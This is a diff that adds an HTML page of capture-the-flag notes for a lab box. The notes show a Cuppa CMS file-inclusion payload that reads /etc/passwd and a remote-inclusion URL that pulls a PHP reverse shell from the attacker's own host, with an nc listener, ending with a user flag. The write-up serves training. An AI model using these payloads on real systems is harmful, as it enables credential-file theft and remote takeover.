@@ -1,0 +1,35 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>2 Gaining Access</title>
+</head><body>https://www.exploit-db.com/exploits/25971<br/>
+<br/>
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd <br/>
+<br/>
+http://10.10.82.56/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd<br/>
+<br/>
+<img src="image.png" width="800" height="206" /><br/>
+Prepare PHP Reverse Shell<br/>
+https://github.com/pentestmonkey/php-reverse-shell<br/>
+<br/>
+Then setup http server with python<br/>
+<br/>
+<img src="image_2.png" width="400" height="133" /><br/>
+<br/>
+<br/>
+Setup nc reverse shell<br/>
+<img src="image_3.png" /><br/>
+<br/>
+Type on your browser <br/>
+http://10.10.82.56/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.14.29.62/reverse.php<br/>
+<br/>
+We got reverse shell!<br/>
+<img src="image_4.png" width="700" height="133" /><br/>
+<br/>
+Go to /home/milesdyson to get user flag<br/>
+<br/>
+<img src="image_5.png" /><br/>
+<br/>
+<br/>
+</body></html>
